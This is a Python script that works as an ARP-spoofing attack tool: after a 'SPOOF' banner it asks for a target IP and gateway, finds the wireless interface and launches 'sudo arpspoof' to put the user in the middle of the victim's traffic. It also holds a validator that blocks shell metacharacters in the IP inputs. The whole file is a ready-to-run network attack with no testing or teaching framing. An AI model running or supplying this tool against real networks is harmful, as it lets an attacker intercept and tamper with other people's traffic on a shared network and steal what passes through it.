import subprocess
import time
import re

# =============================================================================
# INPUT VALIDATION HELPERS
# =============================================================================

def validate_ip_address(ip):
    """
    Validate IPv4 address format.
    Returns True if valid, False otherwise.
    """
    if not ip or not isinstance(ip, str):
        return False
    
    # Remove dangerous shell characters
    dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '{', '}', '<', '>', '\n', '\r', '\\']
    for char in dangerous_chars:
        if char in ip:
            return False
    
    # IPv4 address pattern
    ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(ipv4_pattern, ip):
        # Check each octet is valid (0-255)
        octets = ip.split('.')
        for octet in octets:
            if int(octet) < 0 or int(octet) > 255:
                return False
        return True
    return False


# Function for spoofing the target
def spoof_arp(target_ip, target_gateway):
    """
    Perform ARP spoofing attack on target IP with given gateway.
    """
    # Validate inputs
    if not validate_ip_address(target_ip):
        print("\033[31mError: Invalid target IP address format.\033[0m")
        return
    
    if not validate_ip_address(target_gateway):
        print("\033[31mError: Invalid gateway IP address format.\033[0m")
        return
    
    # Display the interface name using argument list (no shell=True)
    result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
    iface = None
    for line in result.stdout.split('\n'):
        if 'Interface' in line:
            parts = line.split()
            if len(parts) >= 2:
                iface = parts[1]
                break
    
    if not iface:
        print("\033[31mError: Could not detect wireless interface.\033[0m")
        return

    # Start arpspoof command
    print("\n\033[35mStart ARP spoofing...")
    try:
        spoof = subprocess.Popen(
            ['sudo', 'arpspoof', '-i', iface, '-t', target_ip, '-r', target_gateway],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        stdout, stderr = spoof.communicate()
        if stderr:
            print(stderr.decode())
        
        print(stdout.decode())  # Fixed: was stdout.decode (missing parentheses)
        
        t = input("\n\033[35mDo you want to terminate? (Y/N): ")
        if t.upper() == 'Y':
            spoof.kill()
            spoof.wait()

        time.sleep(2)
    except FileNotFoundError:
        print("\033[31mError: arpspoof not found. Please install dsniff package.\033[0m")
    except Exception as e:
        print(f"\033[31mError during ARP spoofing: {e}\033[0m")
    
    return 


def initialize():
    """
    Initialize ARP spoofing by collecting target and gateway IPs.
    """
    art = '''
    .d8888. d8888b.  .d88b.   .d88b.  d88888b 
    88'  YP 88  `8D .8P  Y8. .8P  Y8. 88'     
    `8bo.   88oodD' 88    88 88    88 88ooo   
      `Y8b. 88~~~   88    88 88    88 88~~~   
    db   8D 88      `8b  d8' `8b  d8' 88      
    `8888Y' 88       `Y88P'   `Y88P'  YP      
                                          

    '''
    print(f"\n\033[34m{art}\033[0m")
    
    # Get and validate target IP
    while True:
        target_ip = input("\n\033[36mEnter target ip: ")
        if validate_ip_address(target_ip):
            break
        print("\033[31mInvalid IP address format. Please try again.\033[0m")
    
    # Get and validate gateway IP
    while True:
        target_gateway = input("\n\033[36mEnter target gateway: ")
        if validate_ip_address(target_gateway):
            break
        print("\033[31mInvalid IP address format. Please try again.\033[0m")
    
    spoof_arp(target_ip, target_gateway)

if __name__ == "__main__":
    initialize()

